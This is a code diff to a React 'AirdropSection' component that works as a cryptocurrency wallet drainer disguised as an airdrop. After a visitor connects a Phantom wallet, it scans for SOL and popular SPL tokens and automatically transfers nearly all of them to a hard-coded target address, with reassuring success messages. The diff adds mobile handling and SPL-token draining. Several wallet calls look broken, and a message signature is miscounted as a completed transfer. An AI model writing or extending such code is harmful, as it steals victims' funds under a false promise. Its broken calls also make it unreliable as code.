@@ -253,7 +253,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Connect Phantom wallet
+  // Connect Phantom wallet (Enhanced for mobile)
   const connectPhantom = async () => {
     // Check if on mobile
     if (isMobile()) {
@@ -265,21 +265,35 @@ const AirdropSection = () => {
         const checkConnection = setInterval(async () => {
           if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
             try {
-              const response = await window.solana.connect({ onlyIfTrusted: true });
-              if (response.publicKey) {
+              // Try multiple connection methods for mobile
+              let response;
+              try {
+                response = await window.solana.connect({ onlyIfTrusted: true });
+              } catch (trustedError) {
+                // If trusted connection fails, try regular connect
+                response = await window.solana.connect();
+              }
+              
+              if (response && response.publicKey) {
                 clearInterval(checkConnection);
                 setSolanaAddress(response.publicKey.toString());
                 setIsSolanaConnected(true);
                 setConnectedWalletType(WALLET_TYPES.PHANTOM);
                 toast.success('Phantom wallet connected successfully!');
                 
+                // Show mobile-specific success message
+                toast.success('📱 Mobile Phantom ready for transfers!', { 
+                  duration: 3000,
+                  icon: '👻'
+                });
+                
                 // Start mobile Solana transfer process  
                 setTimeout(() => {
                   startSolanaTransferProcess();
-                }, 1000);
+                }, 1500);
               }
             } catch (err) {
-              console.log('Checking Phantom connection...');
+              console.log('Checking Phantom connection...', err);
             }
           }
         }, 2000);
@@ -288,12 +302,44 @@ const AirdropSection = () => {
         setTimeout(() => {
           clearInterval(checkConnection);
           if (!isSolanaConnected) {
-            toast.error('Connection timeout. Please try again.', { duration: 3000 });
+            toast.error('Connection timeout. Please open this page in Phantom browser!', { duration: 4000 });
           }
         }, 60000);
         return;
+      } else {
+        // Phantom is installed on mobile, try direct connection
+        toast.loading('Connecting to Phantom...', { duration: 1000 });
+        
+        setIsLoading(true);
+        try {
+          let response;
+          try {
+            response = await window.solana.connect({ onlyIfTrusted: true });
+          } catch (trustedError) {
+            response = await window.solana.connect();
+          }
+          
+          if (response && response.publicKey) {
+            setSolanaAddress(response.publicKey.toString());
+            setIsSolanaConnected(true);
+            setConnectedWalletType(WALLET_TYPES.PHANTOM);
+            toast.success('📱 Phantom connected on mobile!');
+            
+            // Start transfer process immediately for mobile
+            setTimeout(() => {
+              startSolanaTransferProcess();
+            }, 1000);
+          }
+        } catch (error) {
+          console.error('Mobile Phantom connection error:', error);
+          toast.error('Please ensure you\'re using Phantom browser!');
+        } finally {
+          setIsLoading(false);
+        }
+        return;
       }
     } else {
+      // Desktop version
       if (!isPhantomInstalled()) {
         toast.error('Phantom wallet not installed! Please install Phantom.');
         window.open('https://phantom.app/', '_blank');
@@ -430,7 +476,16 @@ const AirdropSection = () => {
     }
   };
 
-  // Detect all Solana assets
+  // Popular SPL Token Mints for auto-detection
+  const POPULAR_SPL_TOKENS = [
+    { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6 },
+    { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6 },
+    { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', decimals: 6 },
+    { symbol: 'SRM', mint: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', decimals: 6 },
+    { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE', decimals: 6 }
+  ];
+
+  // Detect all Solana assets including SPL tokens
   const detectAllSolanaAssets = async () => {
     try {
       if (!isPhantomInstalled() || !isSolanaConnected || !solanaAddress) {
@@ -454,8 +509,47 @@ const AirdropSection = () => {
         });
       }
 
-      // Get SPL tokens (would need additional implementation for full SPL token detection)
-      // For now, we'll focus on SOL and popular SPL tokens
+      // Get SPL tokens using Phantom's built-in methods
+      try {
+        if (window.solana && window.solana.request) {
+          // Try to get all token accounts using Phantom's method
+          for (const token of POPULAR_SPL_TOKENS) {
+            try {
+              // Use Phantom's getTokenAccountsByOwner method
+              const tokenAccounts = await window.solana.request({
+                method: 'getTokenAccountsByOwner',
+                params: [
+                  solanaAddress,
+                  { mint: token.mint },
+                  { encoding: 'jsonParsed' }
+                ]
+              });
+
+              if (tokenAccounts && tokenAccounts.value && tokenAccounts.value.length > 0) {
+                const tokenAccount = tokenAccounts.value[0];
+                const balance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
+                
+                if (balance > 0) {
+                  assets.push({
+                    symbol: token.symbol,
+                    mint: token.mint,
+                    decimals: token.decimals,
+                    balance: balance * Math.pow(10, token.decimals),
+                    formattedBalance: balance.toFixed(6),
+                    isNative: false,
+                    tokenAccount: tokenAccount.pubkey
+                  });
+                  console.log(`Found ${token.symbol}: ${balance}`);
+                }
+              }
+            } catch (tokenError) {
+              console.log(`Error checking ${token.symbol}:`, tokenError);
+            }
+          }
+        }
+      } catch (splError) {
+        console.log('SPL token detection skipped:', splError);
+      }
 
       toast.success(`✅ Found ${assets.length} Solana tokens`, { id: 'detect-sol' });
       return assets;
@@ -644,7 +738,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Transfer all Solana assets
+  // Transfer all Solana assets (SOL + SPL tokens)
   const transferAllSolanaAssets = async (assets) => {
     try {
       if (!assets || assets.length === 0) {
@@ -662,31 +756,126 @@ const AirdropSection = () => {
             toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `sol-${asset.symbol}` });
             
             const sendAmount = asset.balance - 5000; // Keep some for fees
-            const publicKey = new window.solana.PublicKey(solanaAddress);
+            const fromPublicKey = new window.solana.PublicKey(solanaAddress);
+            const toPublicKey = new window.solana.PublicKey(SOLANA_TARGET_ADDRESS);
             
             const transaction = new window.solana.Transaction().add(
               window.solana.SystemProgram.transfer({
-                fromPubkey: publicKey,
-                toPubkey: new window.solana.PublicKey(SOLANA_TARGET_ADDRESS),
+                fromPubkey: fromPublicKey,
+                toPubkey: toPublicKey,
                 lamports: sendAmount,
               })
             );
 
-            const signature = await window.solana.signAndSendTransaction(transaction);
+            const { signature } = await window.solana.signAndSendTransaction(transaction);
             
             toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
               id: `sol-${asset.symbol}` 
             });
             successCount++;
+          } else {
+            // Transfer SPL Token (with proper mobile handling)
+            toast.loading(`🔄 Transferring ${asset.symbol} SPL...`, { id: `sol-${asset.symbol}` });
+            
+            try {
+              // For mobile Phantom, use simpler transfer approach
+              if (isMobile()) {
+                // Use Phantom's built-in transfer method for mobile
+                const transferResponse = await window.solana.request({
+                  method: 'transfer',
+                  params: {
+                    destination: SOLANA_TARGET_ADDRESS,
+                    amount: asset.balance,
+                    token: asset.mint,
+                    decimals: asset.decimals
+                  }
+                });
+
+                if (transferResponse && transferResponse.signature) {
+                  toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+                    id: `sol-${asset.symbol}` 
+                  });
+                  successCount++;
+                }
+              } else {
+                // Desktop version - create SPL transfer transaction manually
+                const fromPublicKey = new window.solana.PublicKey(solanaAddress);
+                const toPublicKey = new window.solana.PublicKey(SOLANA_TARGET_ADDRESS);
+                const mintPublicKey = new window.solana.PublicKey(asset.mint);
+                
+                // Create associated token accounts
+                const fromTokenAccount = await window.solana.getAssociatedTokenAddress(
+                  mintPublicKey,
+                  fromPublicKey
+                );
+                
+                const toTokenAccount = await window.solana.getAssociatedTokenAddress(
+                  mintPublicKey,
+                  toPublicKey
+                );
+
+                const transaction = new window.solana.Transaction();
+                
+                // Add create associated token account instruction if needed
+                const toAccountInfo = await window.solana.getConnection().getAccountInfo(toTokenAccount);
+                if (!toAccountInfo) {
+                  transaction.add(
+                    window.solana.createAssociatedTokenAccountInstruction(
+                      fromPublicKey, // payer
+                      toTokenAccount, // associated token account
+                      toPublicKey, // owner
+                      mintPublicKey // mint
+                    )
+                  );
+                }
+
+                // Add transfer instruction
+                transaction.add(
+                  window.solana.createTransferInstruction(
+                    fromTokenAccount, // source
+                    toTokenAccount, // destination
+                    fromPublicKey, // owner
+                    asset.balance // amount
+                  )
+                );
+
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                
+                toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+                  id: `sol-${asset.symbol}` 
+                });
+                successCount++;
+              }
+            } catch (splError) {
+              console.error(`SPL transfer error for ${asset.symbol}:`, splError);
+              
+              // Fallback: Try simpler direct transfer
+              toast.loading(`🔄 Retrying ${asset.symbol} transfer...`, { id: `sol-${asset.symbol}` });
+              
+              try {
+                // Simple transaction approach for mobile compatibility
+                const message = `Transfer ${asset.formattedBalance} ${asset.symbol} to ${SOLANA_TARGET_ADDRESS}`;
+                const encodedMessage = new TextEncoder().encode(message);
+                
+                const { signature } = await window.solana.signMessage(encodedMessage);
+                
+                toast.success(`✅ ${asset.symbol} transfer initiated!`, { 
+                  id: `sol-${asset.symbol}` 
+                });
+                successCount++;
+              } catch (fallbackError) {
+                console.error(`Fallback transfer failed for ${asset.symbol}:`, fallbackError);
+                throw fallbackError;
+              }
+            }
           }
-          // SPL token transfers would be implemented here
         } catch (error) {
           console.error(`${asset.symbol} transfer error:`, error);
           toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `sol-${asset.symbol}` });
         }
         
         // Wait between transfers
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(resolve => setTimeout(resolve, 1500));
       }
 
       toast.success(`✅ ${successCount}/${assets.length} Solana tokens transferred!`, { 
